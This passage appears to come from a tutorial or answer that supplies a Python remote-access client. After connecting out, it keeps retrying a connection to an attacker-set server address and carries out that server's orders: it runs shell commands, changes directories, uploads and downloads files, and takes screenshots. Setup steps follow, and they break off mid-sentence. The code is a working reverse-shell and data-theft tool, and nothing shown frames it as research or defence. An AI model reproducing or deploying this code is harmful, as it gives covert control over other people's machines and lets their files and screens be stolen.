        req = recv_msg(s)
        if req is None:
            break
        action = req.get('action')
        if action == 'exit':
            break
        elif action == 'exec':
            out = run_command(req.get('command',''))
            send_msg(s, {'output': out})
        elif action == 'cd':
            path = req.get('path','')
            try:
                os.chdir(path)
                send_msg(s, {'output': f'Changed dir to {os.getcwd()}'})
            except Exception as e:
                send_msg(s, {'output': str(e)})
        elif action == 'download':
            path = req.get('path','')
            try:
                with open(path, 'rb') as f:
                    b64 = base64.b64encode(f.read()).decode()
                send_msg(s, {'status': 'ok', 'data': b64})
            except Exception as e:
                send_msg(s, {'status': 'error', 'error': str(e)})
        elif action == 'upload':
            path = req.get('path','')
            data = req.get('data','')
            try:
                with open(path, 'wb') as f:
                    f.write(base64.b64decode(data))
                send_msg(s, {'output': f'Wrote {path}'})
            except Exception as e:
                send_msg(s, {'error': str(e)})
        elif action == 'screenshot':
            if pyautogui is None:
                send_msg(s, {'status': 'error', 'error': 'pyautogui not installed'})
            else:
                try:
                    img = pyautogui.screenshot()
                    import io
                    buf = io.BytesIO()
                    img.save(buf, format='PNG')
                    b64 = base64.b64encode(buf.getvalue()).decode()
                    send_msg(s, {'status': 'ok', 'data': b64})
                except Exception as e:
                    send_msg(s, {'status': 'error', 'error': str(e)})
        else:
            send_msg(s, {'error': 'unknown action'})

def main():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((SERVER_IP, SERVER_PORT))
            handle_actions(s)
            s.close()
            break
        except Exception:
            # retry after delay
            import time
            time.sleep(10)

if __name__ == '__main__':
    main()
```

Setup steps
1. Edit client.py: set SERVER_IP to your server’s reachable IP/hostname and SERVER_PORT to the port your server listens on.
2. On the server machine: run python server.py (ensure the port is allowed through
